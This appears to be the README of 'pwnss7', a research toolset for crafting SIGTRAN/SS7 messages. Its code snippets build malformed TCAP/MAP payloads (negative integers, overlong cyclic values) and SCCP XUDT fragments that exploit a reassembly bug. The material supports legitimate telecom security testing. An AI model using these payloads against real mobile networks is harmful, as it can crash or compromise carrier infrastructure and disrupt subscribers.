# pwnss7

Detect and demonstrate SIGTRAN vulnerabilities. Examples of vulnerabilities found using this toolset have been presented at BlackHat USA 2019, [slides here](https://i.blackhat.com/USA-19/Thursday/us-19-Teissier-Mobile-Interconnect-Threats-Up.pdf), or [here](https://github.com/gteissier/mobile-interconnect-threats/blob/master/us-19-Teissier-Mobile-Interconnect-Threats-How-Next-Gen-Products-May-Be-Already-Outdated.pdf).

Named after the venerable Pythonic pwntools, this toolset helps to:

* build the following SIGTRAN layers: M3UA, SCCP, TCAP and MAP (though it should work with CAP as well)
* play with SCCP and in particular generate XUDT fragments, potentially ill-formatted sequence of fragments
* tweak TCAP and MAP layers, in order to inject harmful data, such as overlong string, or negative integer
* wrap packets into a pcap stream

It forms a nice companion to pwntools to play with SIGTRAN implementations.

An example of [M3UA alignment](examples/m3ua-align-and-deliver.py) gives a rough and simple example of alignment and active interaction with a SIGTRAN component.

Some examples, like the ones exercising SCCP reassembly, generate a stream of packets in a pcap wrap.

# PCAP

The generation of pcap formatted data above will be done through the use of `text2pcap`, as implemented in [pwnss7/util.py](pwnss7/util.py).

```python
def convert2pcap(pkts, sctp=[1337,31337,3], v4=['127.0.0.1', '127.0.0.1'], eth=None):
```

Default parameters, added above M3UA include:

* SCTP: from port 1337 to port 31337, with ppid set to 3 (M3UA)
* IPv4: source and destination set to 127.0.0.1
* Ethernet: not set, automatically generated. Use it to generate packets to/from a specific MAC address if you need to.

# SCTP

[pwnss7/sctp.py](pwnss7/sctp.py) contains the bare minimum to use OS level SCTP sockets. Monkey-patching is used to add missing constants to Python socket module. This is typically of use when testing an active system. As a reminder:

* M3UA management messages are transported using stream 0;
* M3UA data messages are transported using stream different from 0, e.g. 1.

The matching implementation can be viewed in m3ua alignment example, via the use of SCTP `setdefaultsndrcvinfo`.

# M3UA

[pwnss7/m3ua.py](pwnss7/m3ua.py) contains the implementation of DATA message, which transports SCCP/TCAP/MAP payload. The required arguments are:

* the SCCP payload
* the originating point code
* the destination point code
* the selected linkset

```python
def encode_data(sccp, opc, dpc, sls):
```

In order to generate pcap traces, it will be enough. But to deliver this payload in an active manner, one needs to align propermy at M3UA using ASPUP / ASPAC messages. A trivial and very basic - please read possibly wrong - m3ua alignment procedure has been performed in [m3ua alignment example](examples/m3ua-align-and-deliver.py), with the use of a single routing key `0x4242`.

# SCCP

[pwnss7/sccp.py](pwnss7/sccp.py) contains the minimum required to encode UDT and XUDT messages.



```python
def encode_udt(tcap, called_gt, calling_gt):
```

```python
def encode_xudt(chunk, first_segment, remaining, called_gt, calling_gt):
```

Generated fragment will be associated with the segmentation identifier `0xb1eed4`.

An helper function generates XUDT fragments that will reassemble to a given payload:

```python
def fragment(tcap, called_gt, calling_gt, size=42):
```

Two examples use SCCP fragmentation:

* [examples/overflow-xudt.py](examples/overflow-xudt.py) which fragments 2k of cyclic data at TCAP level
* [examples/overflow-xudt-trick-remaining.py](examples/overflow-xudt-trick-remaining.py) which exploits a reassembly bug to reassemble to arbitrary long payload on the target


# TCAP / MAP

[pwnss7/ber.py](pwnss7/ber.py) contains a class definition and methods to define, encode and decode ASN1 BER objects. For those who are not familiar with ASN1, two good readings:

* [A Layman's Guide to a Subset of ASN.1, BER, and DER](http://luca.ntop.org/Teaching/Appunti/asn1.html)
* [Downloadable books from Olivier Dubuisson and John Larmouth](https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html)

It is important to understand that the MAP part is embedded into the TCAP payload, so by decoding TCAP, we will decode TCAP and MAP, and conversly by encoding TCAP, we will also encode MAP payload embedded in TCAP. Camel, or CAP, works the same, so we may also decode and encode TCAP/CAP payloads, for free.

For our purposes, we suggest the three illustrative steps:

* decode a TCAP/MAP (or CAP) payload contained in a network trace
* alter it to add a harmful value
* encode it to embed it in an SCCP UDT / XUDT sequence and deliver to target system

## Decode a TCAP/MAP payload

First you will need to extract the TCAP payload. This can be done using Wireshark `Copy ... as a Hex Stream` feature. Once you have an hexstream, you know what to do to turn it into a raw payload, let's call it `tcap.dat`.

To decode the raw payload, just import `pwnss7.ber` module, and it will decode it to the hierarchical tree of objects:

```bash
$ python -m pwnss7.ber tcap.dat
```

It produces:

```python
Asn1Obj(0x1, 1, 0x2, children=[
  Asn1Obj(0x1, 0, 0x8, value='/;F\x02'),
  Asn1Obj(0x1, 1, 0xb, children=[
    Asn1Obj(0x0, 1, 0x8, children=[
      Asn1Obj(0x0, 0, 0x6, value='\x00\x11\x86\x05\x01\x01\x01'),
      Asn1Obj(0x2, 1, 0x0, children=[
        Asn1Obj(0x1, 1, 0x0, children=[
          Asn1Obj(0x2, 0, 0x0, value='\x07\x80'),
          Asn1Obj(0x2, 1, 0x1, children=[
            Asn1Obj(0x0, 0, 0x6, value='\x04\x00\x00\x01\x00\x13\x02'),
          ]),
          Asn1Obj(0x2, 1, 0x1e, children=[
            Asn1Obj(0x0, 1, 0x8, children=[
              Asn1Obj(0x0, 0, 0x6, value='\x04\x00\x00\x01\x01\x01\x01'),
              Asn1Obj(0x2, 1, 0x0, children=[
                Asn1Obj(0x2, 1, 0x0, children=[
                  Asn1Obj(0x2, 0, 0x0, value='\x96V\x05\x11$\x00i\x13\xf6'),
                ]),
              ]),
            ]),
          ]),
        ]),
      ]),
    ]),
  ]),
  Asn1Obj(0x1, 1, 0xc, children=[
    Asn1Obj(0x2, 1, 0x1, children=[
      Asn1Obj(0x0, 0, 0x2, value='\x01'),
      Asn1Obj(0x0, 0, 0x2, value=';'),
      Asn1Obj(0x0, 1, 0x10, children=[
        Asn1Obj(0x0, 0, 0x4, value='\x0f'),
        Asn1Obj(0x0, 0, 0x4, value='\xaa\x18\r\xa6\x82\xddl1\x19-6\xbb\xddF'),
        Asn1Obj(0x2, 0, 0x0, value="\x91rgAX'\xf2"),
      ]),
    ]),
  ]),
])
```

## Getting to know better an ASN1Obj instance

```python
class Asn1Obj:
  '''generic frame for ASN1 fields, supports nesting'''
  def __init__(self, klass, constructed, type, indefinite=False, value=None, children=[], absorbed=None):
    self.klass = klass
    self.constructed = constructed
    self.type = type
    self.indefinite = indefinite
    self.value = value
    self.children = children
    self.absorbed = absorbed
```

The few properties of ASN1Obj instance are:

* its class, named klass in the code as class is a reserved keyword in Python
* its type
* its being primitive / constructed
* its value if is is primitive, or its children if it is constructed

As you may have noticed, values are raw bytes, no syntactic sugar is added on top of it to turn bytes into integer when it is possible to do so. While this is not very important to read the content, editing values can be more complex.

## Fooling implementations

### Negative integers

ASN1 integers are signed integers. Implementations may not cope with that properly. `encode_integer` will represent signed integers and encode them to value usable in ASN1Object.

```python
NEGATIVE_CALLBACK_INDEX = -666
opcode = encode_integer(NEGATIVE_CALLBACK_INDEX)

Asn1Obj(0x0, 0, 0x2, 0, value=opcode)
```

### Arbitrary long values

ASN1 values can be pretty long, the limit is the ability to express the length of the value. Constructed values can have any number of elements, using the indefinite length. Primitive values have their length limited to the maximum expressable length which is `2^889-1` (127 limbs of 7 bits).

It is good practice to send data generated using cyclic, either from pwntools or using the implementation provided in [pwnss7/util.py](pwnss7/util.py).

```python
from pwnss7.util import cyclic, split_by

# cyclic can be replaced by pwnlib's cyclic as well
cyclic_acn = cyclic(1024)

tcap = Asn1Obj(0x1, 1, 0x2, 0, children=[
  Asn1Obj(0x1, 0, 0x8, 0, value='\x00\x00\x00\x01'),
  Asn1Obj(0x1, 1, 0xb, 0, children=[
    Asn1Obj(0x0, 1, 0x8, 0, children=[
      Asn1Obj(0x0, 0, 0x6, 0, value=cyclic_acn),
```

## Encode to a wire payload

Encoding the above tcap payload can be done using StringIO to create a writable buffer:

```python
f = StringIO()
encode_ber(f, tcap)
encoded_tcap = f.getvalue()
```

It is possible to encode a constructed object using indefinite length, by using the indefinite property of ASN1Obj instance:

```python
from pwnss7.ber import encode_ber, decode_ber, Asn1Obj

tcap = Asn1Obj(0x1, 1, 0x2, indefinite=True, children=[
  Asn1Obj(0x1, 0, 0x8, value='/;F\x02'),
  Asn1Obj(0x1, 1, 0xb, children=[
    Asn1Obj(0x0, 1, 0x8, children=[
      Asn1Obj(0x0, 0, 0x6, value='\x00\x11\x86\x05\x01\x01\x01'),
```

# Wrap up

The only thing left is to send the payload using the different layers, which gives:

```python
tcap = ...

f = StringIO()
encode_ber(f, tcap)
encoded_tcap = f.getvalue()

CALLED_GT = unhexlify('12930011047228190600')
CALLING_GT = unhexlify('1206001104722819604106')

pkt = encode_data(
  encode_udt(encoded_tcap, CALLED_GT, CALLING_GT),
  666, # originating point code
  1337,# destination point code
  0,   # signalling link selection
)

# pkt is the byte representation at M3UA level, ready to be either sent using SCTP, or encapsulated into a pcap
```

You can find examples of use in [examples](examples).
